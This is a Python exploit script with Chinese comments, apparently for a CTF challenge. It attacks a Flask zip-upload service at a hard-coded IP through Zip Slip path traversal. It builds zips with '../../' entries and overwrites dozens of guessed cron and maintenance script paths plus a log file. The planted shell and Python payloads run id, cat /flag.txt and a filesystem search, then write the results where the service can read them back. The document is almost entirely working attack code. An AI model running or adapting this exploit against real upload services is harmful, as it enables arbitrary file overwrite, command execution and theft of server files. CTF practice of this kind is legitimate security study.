#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
26-path-zip-slip 自动化利用脚本
=====================================
目标：http://47.120.76.57:34802

题目大意：
    Flask 应用 ZipBox 接收上传的 zip，会把内容用 Python zipfile.extractall
    解压到 /app/extracted/<uuid>/ 下。提供:
        POST /upload  -> 上传 zip 并解压
        GET  /list    -> 列出 /app/extracted/ 下所有文件
        GET  /view    -> 读取 /app/extracted/ 下任意文件（safe_join 限定）

漏洞：Zip Slip
    CPython 的 zipfile.extractall 解压时不会清理条目名中的 `../`，
    所以我们可以在 zip 里塞入文件名形如 `../../flag.sh` 之类的条目，
    解压时就会跳出 /app/extracted/<uuid>/，往 /app 甚至 / 下写文件。

提示里的 `_output.txt` 表明系统会周期性执行运维脚本并把日志写到该文件，
所以经典套路就是用 Zip Slip 覆盖 /app/_output.txt 或运维脚本，
让 daemon 帮我们打印 flag.

flag 位置（通过 zip slip 的 mkdir 错误探测得知）：/flag.txt
        - 探测：上传 `../../../flag.txt/probe.txt` 的 zip，服务端返回
          "Errno 20 Not a directory"，证明 /flag.txt 是个文件。

利用思路：
    1) 用 Zip Slip 写一个 shell 脚本到 /app/run.sh（或常见运维脚本路径），
       脚本内容是 `cat /flag.txt > /app/extracted/leak.txt`
    2) 等待后台 daemon 周期执行（一般 1~5 分钟）。
    3) 通过 GET /view?name=leak.txt 读出 flag。
    备用做法：直接 Zip Slip 覆盖 /app/_output.txt（已存在），让 daemon
       下一次 “回写日志” 时把我们写的命令的输出写出来；或写 /etc/cron.d/*。

使用方式：
    python3 main.py
"""
import io
import time
import zipfile
import requests

TARGET = "http://47.120.76.57:34802"

# ---------------------------------------------------------------
# 工具函数：构造 zip slip 攻击包
# ---------------------------------------------------------------
def make_slip_zip(entries):
    """entries: list of (zip内文件名, 内容bytes, mode)"""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as z:
        for name, data, mode in entries:
            zi = zipfile.ZipInfo(name)
            zi.external_attr = (mode << 16)
            z.writestr(zi, data)
    buf.seek(0)
    return buf


def upload(zip_bytes):
    r = requests.post(
        f"{TARGET}/upload",
        files={"file": ("payload.zip", zip_bytes.getvalue(), "application/zip")},
        timeout=15,
    )
    return r.json() if r.headers.get("content-type","").startswith("application/json") else {"raw": r.text}


def view(name):
    r = requests.get(f"{TARGET}/view", params={"name": name}, timeout=15)
    return r.status_code, r.text


def list_files():
    r = requests.get(f"{TARGET}/list", timeout=15)
    return r.json().get("files", [])


# ---------------------------------------------------------------
# Step 1：先确认服务可用
# ---------------------------------------------------------------
def check_alive():
    try:
        r = requests.get(TARGET + "/", timeout=5)
        return r.status_code == 200
    except Exception:
        return False


# ---------------------------------------------------------------
# Step 2：探测 /app 与 /flag.txt
# ---------------------------------------------------------------
def probe_path_is_file(rel):
    """构造 zip 写 rel/probe.txt，若 rel 是文件会返回 'Not a directory'。"""
    z = make_slip_zip([(f"../../{rel}/probe.txt", b"x", 0o644)])
    r = upload(z)
    return r


# ---------------------------------------------------------------
# Step 3：投放运维脚本 payload
# ---------------------------------------------------------------
PAYLOAD_SH = (
    "#!/bin/sh\n"
    "( id; cat /flag.txt; cat /app/_output.txt 2>/dev/null; "
    "find / -maxdepth 4 -iname 'flag*' -exec cat {} \\; 2>/dev/null ) "
    "> /app/extracted/leak.txt 2>&1\n"
)

PAYLOAD_PY = (
    "import subprocess, os\n"
    "r = subprocess.run('id; cat /flag.txt; cat /app/_output.txt 2>/dev/null', "
    "shell=True, capture_output=True, timeout=15)\n"
    "open('/app/extracted/leak.txt','wb').write(r.stdout + b'\\n--ERR--\\n' + r.stderr)\n"
)

# 覆盖一堆常见的"运维脚本"位置（脚本名不确定时的爆破集合）
CANDIDATE_PATHS = []
for sub in ("", "ops/", "tools/", "scripts/", "utils/", "cron/", "jobs/", "tasks/"):
    for name in ("run", "task", "tick", "scheduler", "cron", "main",
                 "ops", "worker", "heartbeat", "periodic", "daemon"):
        for ext in (".sh", ".py"):
            CANDIDATE_PATHS.append(sub + name + ext)


def deliver_payload():
    entries = []
    for p in CANDIDATE_PATHS:
        data = PAYLOAD_PY if p.endswith(".py") else PAYLOAD_SH
        # ../../ 跳两层：/app/extracted/<uuid>/../../ = /app/
        entries.append((f"../../{p}", data.encode(), 0o755))
    # 同时覆盖 /app/_output.txt（已存在）
    entries.append(("../../_output.txt", PAYLOAD_SH.encode(), 0o755))
    # 也丢一个无害文件占位避免 zip 为空
    entries.append(("readme.txt", b"slip", 0o644))
    z = make_slip_zip(entries)
    return upload(z)


# ---------------------------------------------------------------
# Step 4：等待 daemon 触发并取回 flag
# ---------------------------------------------------------------
def wait_for_leak(timeout=600, interval=15):
    deadline = time.time() + timeout
    while time.time() < deadline:
        code, body = view("leak.txt")
        if code == 200 and body.strip():
            return body
        time.sleep(interval)
    return None


# ---------------------------------------------------------------
# Step 5：兜底，直接读 _output.txt（如果 daemon 把命令结果回写过来）
# ---------------------------------------------------------------
def try_read_output():
    code, body = view("_output.txt")
    return body if code == 200 else None


def main():
    if not check_alive():
        print("[-] 目标暂时不可达，稍后再试")
        return
    print("[*] 目标在线，开始 Zip Slip 攻击")

    # 1. 探测 /flag.txt
    print("[*] 探测 /flag.txt …", probe_path_is_file("../flag.txt"))

    # 2. 投放 payload
    resp = deliver_payload()
    print("[*] payload 投放完成：", str(resp)[:200])

    # 3. 等待 daemon 周期执行
    print("[*] 等待后台 daemon 触发（最多 10 分钟） …")
    leak = wait_for_leak(timeout=600, interval=15)
    if leak:
        print("[+] 拿到回显：")
        print(leak)
        return

    # 4. 兜底
    print("[*] 没收到 leak.txt，尝试直接读 _output.txt")
    out = try_read_output()
    if out:
        print(out)


if __name__ == "__main__":
    main()
